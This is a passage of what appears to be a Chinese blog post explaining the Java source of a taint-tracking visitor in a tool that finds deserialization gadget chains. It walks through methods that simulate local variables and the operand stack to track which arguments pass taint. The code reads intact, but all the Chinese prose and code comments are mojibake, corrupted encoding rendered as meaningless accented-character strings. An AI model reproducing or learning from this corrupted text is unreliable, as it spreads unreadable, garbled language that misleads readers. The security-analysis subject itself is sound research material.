åœ¨å¤„ç†æ–¹æ³•è°ƒç”¨ä¸­çš„æœ¬åœ°å˜é‡è¡¨å’Œæ“ä½œæ•°æ ˆï¼Œå› æ­¤å®é™…è°ƒç”¨çš„è®¿é—®è€…æ–¹æ³•æ¥è‡ª PassthroughDataflowMethodVisitorã€TaintTrackingMethodVisitorã€MethodVisitor ä¸‰ä¸ªç±»ã€‚æ¨¡æ‹Ÿæ˜¯æ ¹æ®å¯¹å­—èŠ‚ç æŒ‡ä»¤å’Œ JVM çš„äº†è§£æ‰‹åŠ¨è¿›è¡Œå®ç°ï¼ˆæ•‘å‘½ï¼‰ï¼Œå…ˆè§£æè¿™é‡Œçš„ 4 ä¸ªé‡å†™æ–¹æ³•ã€‚</p><p>æ•°æ®æµä¿¡æ¯ <code>passthroughDataflow</code> åˆå§‹ä¸ºç©ºï¼Œé›†åˆå˜é‡ <code>returnTaint</code> ç”¨äºè®°å½•ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">PassthroughDataflowMethodVisitor</span> <span class="keyword">extends</span> <span class="title class_">TaintTrackingMethodVisitor</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, ClassReference&gt; classMap;              <span class="comment">// ç±»ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;                                    <span class="comment">// ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;    <span class="comment">// æ•°æ®æµä¿¡æ¯ï¼šæ–¹æ³•-&gt;ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;                          <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> access;               <span class="comment">// è®¿é—®æ ‡å¿—</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String desc;              <span class="comment">// æè¿°ç¬¦</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;Integer&gt; returnTaint; <span class="comment">// èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PassthroughDataflowMethodVisitor</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span><br><span class="line"><span class="params">                                            InheritanceMap inheritanceMap, Map&lt;MethodReference.Handle,</span></span><br><span class="line"><span class="params">            Set&lt;Integer&gt;&gt; passthroughDataflow, SerializableDecider serializableDeciderMap, <span class="type">int</span> api, MethodVisitor mv,</span></span><br><span class="line"><span class="params">                                            String owner, <span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(inheritanceMap, passthroughDataflow, api, mv, owner, access, name, desc, signature, exceptions);</span><br><span class="line">        <span class="built_in">this</span>.classMap = classMap;</span><br><span class="line">        <span class="built_in">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        <span class="built_in">this</span>.passthroughDataflow = passthroughDataflow;</span><br><span class="line">        <span class="built_in">this</span>.serializableDecider = serializableDeciderMap;</span><br><span class="line">        <span class="built_in">this</span>.access = access;</span><br><span class="line">        <span class="built_in">this</span>.desc = desc;</span><br><span class="line">        returnTaint = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitCode</code> æ–¹æ³•å°†è¢«è®¿é—®çš„æ–¹æ³•å‚æ•°è®°å½•åˆ°æœ¬åœ°å˜é‡è¡¨ä¸­ï¼Œå¦‚æœæ˜¯éé™æ€æ–¹æ³•ï¼Œåˆ™æ·»åŠ éšå¼å‚æ•° thisã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitCode</span><span class="params">()</span> &#123;   <span class="comment">// å¯åŠ¨å¯¹æ–¹æ³•ä»£ç çš„è®¿é—®</span></span><br><span class="line">    <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitCode åˆå§‹åŒ–æœ¬åœ°å˜é‡è¡¨</span></span><br><span class="line">    <span class="built_in">super</span>.visitCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®°å½•å‚æ•°åˆ°æœ¬åœ°å˜é‡è¡¨ savedVariableState.localVars</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">localIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">argIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// éé™æ€æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆéšå¼ï¼‰ä¸ºå¯¹è±¡å®ä¾‹ this</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.setLocalTaint æ·»åŠ åˆ°æœ¬åœ°å˜é‡è¡¨</span></span><br><span class="line">        setLocalTaint(localIndex, argIndex);</span><br><span class="line">        localIndex += <span class="number">1</span>;</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†å‚æ•°ï¼Œæ ¹æ®æè¿°ç¬¦å¾—å‡ºå‚æ•°ç±»å‹ï¼ˆå ç”¨ç©ºé—´å¤§å°ï¼‰</span></span><br><span class="line">    <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.setLocalTaint æ·»åŠ åˆ°æœ¬åœ°å˜é‡è¡¨</span></span><br><span class="line">        setLocalTaint(localIndex, argIndex);</span><br><span class="line">        localIndex += argType.getSize();</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitInsn</code> æ–¹æ³•å°†å­˜å‚¨åœ¨æ ˆé¡¶çš„è¿”å›å€¼ï¼ˆä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆï¼Œå¯èƒ½ä¸ºç©ºï¼‰ä¸­çš„å…ƒç´ æ·»åŠ åˆ° <code>returnTaint</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitInsn</span><span class="params">(<span class="type">int</span> opcode)</span> &#123; <span class="comment">// è®¿é—®é›¶æ“ä½œæ•°æŒ‡ä»¤</span></span><br><span class="line">    <span class="comment">// æ–¹æ³•æ‰§è¡Œå®Œæ¯•åå°†ä»æ ˆè¿”å›ç»“æœç»™è°ƒç”¨è€…ï¼Œå› æ­¤æ ˆé¡¶å³è¿”å›å€¼</span></span><br><span class="line">    <span class="comment">// å­˜å‚¨å¯èƒ½è¢«æ±¡æŸ“çš„è¿”å›å€¼åˆ° returnTaint</span></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.IRETURN:   <span class="comment">// ä»å½“å‰æ–¹æ³•è¿”å› int</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.FRETURN:   <span class="comment">// ä»å½“å‰æ–¹æ³•è¿”å› float</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.ARETURN:   <span class="comment">// ä»å½“å‰æ–¹æ³•è¿”å›å¯¹è±¡å¼•ç”¨</span></span><br><span class="line">            <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.getStackTaint è¯»å–æ ˆé¡¶ï¼Œå¤§å°ä¸º 1ï¼ˆ32ä½ï¼‰</span></span><br><span class="line">            returnTaint.addAll(getStackTaint(<span class="number">0</span>));   <span class="comment">// æ ˆç©ºé—´ä»å†…å­˜é«˜ä½åˆ°ä½ä½åˆ†é…ç©ºé—´</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.LRETURN:   <span class="comment">// ä»å½“å‰æ–¹æ³•è¿”å› long</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.DRETURN:   <span class="comment">// ä»å½“å‰æ–¹æ³•è¿”å› double</span></span><br><span class="line">            <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.getStackTaint è¯»å–æ ˆé¡¶ï¼Œå¤§å°ä¸º 2ï¼ˆ64ä½ï¼‰</span></span><br><span class="line">            returnTaint.addAll(getStackTaint(<span class="number">1</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.RETURN:    <span class="comment">// ä»å½“å‰æ–¹æ³•è¿”å› void</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitInsn è¿›è¡Œå‡º/å…¥æ ˆæ“ä½œ</span></span><br><span class="line">    <span class="built_in">super</span>.visitInsn(opcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitFieldInsn</code> æ–¹æ³•åœ¨è¯»å–æˆ–å­˜å‚¨å¯¹è±¡å­—æ®µçš„å€¼æ—¶è°ƒç”¨ï¼Œè¿™é‡Œåˆ¤æ–­å­—æ®µæ˜¯å¦å¯åºåˆ—åŒ–ï¼Œå¦‚æœå¯åºåˆ—åŒ–åˆ™è®¤ä¸ºæ–¹æ³•æ‰€å±ç±»çš„å®ä¾‹å¯¹è±¡æœ¬èº«æˆ–è¢«è°ƒç”¨æ–¹æ³•æ‰€å±ç±»çš„å®ä¾‹å¯¹è±¡æ˜¯å—æ±¡æŸ“çš„ï¼Œå°†å…¶ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆå­˜å‚¨åˆ° <code>taint</code> å˜é‡ä¸­ã€‚<br>å› ä¸ºå¯èƒ½è¯»å–çš„æ˜¯æ–¹æ³•æ‰€å±ç±»çš„å®ä¾‹å¯¹è±¡å­—æ®µï¼Œä¹Ÿå¯èƒ½æ˜¯å…¶ä»–å¯¹è±¡ï¼Œå…¶ä»–å¯¹è±¡å¾—é€šè¿‡æ–¹æ³•è°ƒç”¨è¯»å–å­—æ®µï¼Œæ¶‰åŠåˆ°æ–¹æ³•è°ƒç”¨æ–¹æ³•ï¼Œå…·ä½“è§ <code>visitMethodInsn</code> æ–¹æ³•ä¸­çš„åˆ†æã€‚æœ€åå°†æ ˆé¡¶ï¼ˆè¯»å–å­—æ®µçš„è¿”å›å€¼ï¼‰è®¾ç½®ä¸º <code>taint</code>ï¼Œè¿™é‡Œå¯èƒ½æ˜¯ç©ºçš„ HashSetã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitFieldInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc)</span> &#123;    <span class="comment">// è®¿é—®å­—æ®µæŒ‡ä»¤ï¼Œå­—æ®µæŒ‡ä»¤æ˜¯åŠ è½½æˆ–å­˜å‚¨å¯¹è±¡å­—æ®µå€¼çš„æŒ‡ä»¤ã€‚</span></span><br><span class="line">    <span class="comment">// æ–¹æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­å¯èƒ½è®¿é—®å¯¹è±¡å­—æ®µï¼Œè®¿é—®å‰ä¼šè¿›è¡Œå…¥æ ˆæ“ä½œ</span></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETSTATIC: <span class="comment">// è·å–ç±»çš„é™æ€å­—æ®µ</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTSTATIC: <span class="comment">// è®¾ç½®ç±»çš„é™æ€å­—æ®µ</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETFIELD:  <span class="comment">// è·å–å¯¹è±¡å­—æ®µ</span></span><br><span class="line">            <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> Type.getType(desc); <span class="comment">// å­—æ®µç±»å‹</span></span><br><span class="line">            <span class="keyword">if</span> (type.getSize() == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">Boolean</span> <span class="variable">isTransient</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// å¦‚æœå­—æ®µè¢« transient å…³é”®å­—ä¿®é¥°ï¼Œåˆ™ä¸å¯åºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// åˆ¤æ–­è¯»å–çš„å­—æ®µæ‰€å±ç±»æ˜¯å¦å¯åºåˆ—åŒ–ï¼Œå³å­—æ®µæ˜¯å¦å¯ä»¥åºåˆ—åŒ–</span></span><br><span class="line">                <span class="comment">// If a field type could not possibly be serialized, it&#x27;s effectively transient</span></span><br><span class="line">                <span class="keyword">if</span> (!couldBeSerialized(serializableDecider, inheritanceMap, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(type.getInternalName()))) &#123;</span><br><span class="line">                    isTransient = Boolean.TRUE;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// è‹¥è¯»å–çš„å­—æ®µæ‰€å±ç±»å¯åºåˆ—åŒ–</span></span><br><span class="line">                    <span class="type">ClassReference</span> <span class="variable">clazz</span> <span class="operator">=</span> classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner));</span><br><span class="line">                    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// éå†ç±»çš„æ‰€æœ‰å­—æ®µ</span></span><br><span class="line">                        <span class="keyword">for</span> (ClassReference.Member member : clazz.getMembers()) &#123;</span><br><span class="line">                            <span class="comment">// æ˜¯å¦ä¸ºç›®æ ‡å­—æ®µ</span></span><br><span class="line">                            <span class="keyword">if</span> (member.getName().equals(name)) &#123;</span><br><span class="line">                                <span class="comment">// æ˜¯å¦è¢« transient å…³é”®å­—ä¿®é¥°</span></span><br><span class="line">                                isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != <span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (isTransient != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// è‹¥æ‰¾ä¸åˆ°ç›®æ ‡å­—æ®µï¼Œåˆ™å‘ä¸ŠæŸ¥æ‰¾ï¼ˆè¶…ç±»ï¼‰</span></span><br><span class="line">                        clazz = classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(clazz.getSuperClass()));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">// èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">                Set&lt;Integer&gt; taint;</span><br><span class="line">                <span class="keyword">if</span> (!Boolean.TRUE.equals(isTransient)) &#123;</span><br><span class="line">                    <span class="comment">// è‹¥å­—æ®µæ²¡æœ‰è¢« transient ä¿®é¥°ï¼Œåˆ™è°ƒç”¨ TaintTrackingMethodVisitor.getStackTaint è¯»å–æ ˆé¡¶</span></span><br><span class="line">                    <span class="comment">// å–å‡ºçš„æ˜¯ this æˆ–æŸå®ä¾‹å¯¹è±¡ï¼Œå³å­—æ®µæ‰€å±å®ä¾‹</span></span><br><span class="line">                    taint = getStackTaint(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// å¦åˆ™ä¸ºç©º</span></span><br><span class="line">                    taint = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitFieldInsn è¿›è¡Œå‡º/å…¥æ ˆæ“ä½œ</span></span><br><span class="line">                <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.setStackTaint å°†æ ˆé¡¶è®¾ç½®ä¸º taint</span></span><br><span class="line">                setStackTaint(<span class="number">0</span>, taint);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTFIELD:  <span class="comment">// è®¾ç½®å¯¹è±¡å­—æ®µ</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitFieldInsn è¿›è¡Œå‡º/å…¥æ ˆæ“ä½œ</span></span><br><span class="line">    <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br></pre></td></tr></table></figure><p><code>visitMethodInsn</code> æ–¹æ³•åœ¨æ–¹æ³•è°ƒç”¨æ–¹æ³•æ—¶è°ƒç”¨ï¼ˆç»•å£ä»¤å‘¢ğŸ˜…ï¼‰</p><ul><li>é¦–å…ˆè®°å½•è¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°ç±»å‹ï¼ˆåˆ—è¡¨ï¼‰ï¼Œæ ¹æ®æ˜¯å¦ä¸ºé™æ€æ–¹æ³•æ·»åŠ ç¬¬ä¸€ä¸ªéšå¼å‚æ•°ï¼ˆè¢«è°ƒç”¨æ–¹æ³•æ‰€å±ç±»çš„å®ä¾‹å¯¹è±¡ï¼‰</li><li>ç„¶åè®°å½•è¢«è°ƒç”¨æ–¹æ³•çš„è¿”å›å€¼ç±»å‹é•¿åº¦ï¼ˆ0~2ï¼‰ï¼Œç”¨äºæœ€åå­˜å‚¨ç´¢å¼•é›†åˆ</li><li>æ¨¡æ‹Ÿè¢«è°ƒç”¨æ–¹æ³•çš„æ“ä½œæ•°æ ˆï¼Œå¦‚æœæ˜¯æ„é€ æ–¹æ³•åˆ™è®¤ä¸ºéšå¼å‚æ•°èƒ½å¤Ÿä¼ é€’æ±¡æŸ“ï¼Œå¦‚æœè¢«è°ƒç”¨æ–¹æ³•åœ¨å·²ç»åˆ†æçš„æ•°æ®æµä¿¡æ¯ä¸­åˆ™ç›´æ¥å–å‡ºç›¸åº”çš„å‚æ•°ç´¢å¼•é›†åˆï¼Œä¿å­˜åˆ° <code>resultTaint</code> å˜é‡ä¸­</li><li>è°ƒç”¨çˆ¶ç±»æ–¹æ³• <code>TaintTrackingMethodVisitor.visitMethodInsn</code> æ‰§è¡ŒçœŸæ­£çš„å‡º&#x2F;å…¥æ ˆæ¨¡æ‹Ÿï¼Œç„¶åå°†å‚æ•°ç´¢å¼•é›†åˆå­˜å‚¨åˆ°æ ˆé¡¶</li><li>æœ€åæ ¹æ®è¢«è°ƒç”¨æ–¹æ³•çš„è¿”å›å€¼ç±»å‹é•¿åº¦å°† <code>resultTaint</code> ä¹Ÿåˆå¹¶åˆ°æ ˆé¡¶</li></ul><p>è°ƒç”¨æ–¹æ³•æ—¶ä¼šåˆ›å»ºæ–°çš„æ ˆå¸§å­˜å‚¨ç”¨åˆ°çš„ç›¸å…³æ•°æ®ï¼Œå› æ­¤å½“è°ƒç”¨åˆ° <code>visitMethodInsn</code> æ—¶ä¼šåˆ›å»ºæ–°çš„æ ˆå¸§ï¼Œå…¶æ“ä½œæ•°æ ˆä¸­æ˜¯è¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°ï¼ˆè€Œä¸æ˜¯å½“å‰æ–¹æ³•ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc, <span class="type">boolean</span> itf)</span> &#123;  <span class="comment">// è®¿é—®æ–¹æ³•æŒ‡ä»¤ï¼Œæ–¹æ³•æŒ‡ä»¤æ˜¯è°ƒç”¨æ–¹æ³•çš„æŒ‡ä»¤ã€‚</span></span><br><span class="line">    <span class="comment">// æ ¹æ®æè¿°ç¬¦å¾—å‡ºè¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°ç±»å‹ï¼ˆå ç”¨ç©ºé—´å¤§å°ï¼‰</span></span><br><span class="line">    Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éé™æ€æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯¹è±¡æœ¬èº«ï¼Œå³ this</span></span><br><span class="line">    <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) &#123;</span><br><span class="line">        Type[] extendedArgTypes = <span class="keyword">new</span> <span class="title class_">Type</span>[argTypes.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">        extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);    <span class="comment">// å¯¹è±¡ç±»å‹</span></span><br><span class="line">        argTypes = extendedArgTypes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ ¹æ®æè¿°ç¬¦è·å–è¢«è°ƒç”¨æ–¹æ³•çš„è¿”å›å€¼ç±»å‹å¤§å°</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">retSize</span> <span class="operator">=</span> Type.getReturnType(desc).getSize();</span><br><span class="line">    <span class="comment">// èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">    Set&lt;Integer&gt; resultTaint;</span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESTATIC:      <span class="comment">// è°ƒç”¨é™æ€æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:     <span class="comment">// è°ƒç”¨å®ä¾‹æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESPECIAL:     <span class="comment">// è°ƒç”¨è¶…ç±»æ„é€ æ–¹æ³•ï¼Œå®ä¾‹åˆå§‹åŒ–æ–¹æ³•ï¼Œç§æœ‰æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:   <span class="comment">// è°ƒç”¨æ¥å£æ–¹æ³•</span></span><br><span class="line">            <span class="comment">// æ¨¡æ‹Ÿæ“ä½œæ•°æ ˆ</span></span><br><span class="line">            <span class="keyword">final</span> List&lt;Set&lt;Integer&gt;&gt; argTaint = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Set&lt;Integer&gt;&gt;(argTypes.length);</span><br><span class="line">            <span class="comment">// è°ƒç”¨æ–¹æ³•å‰å…ˆæŠŠæ“ä½œæ•°å…¥æ ˆ</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                argTaint.add(<span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 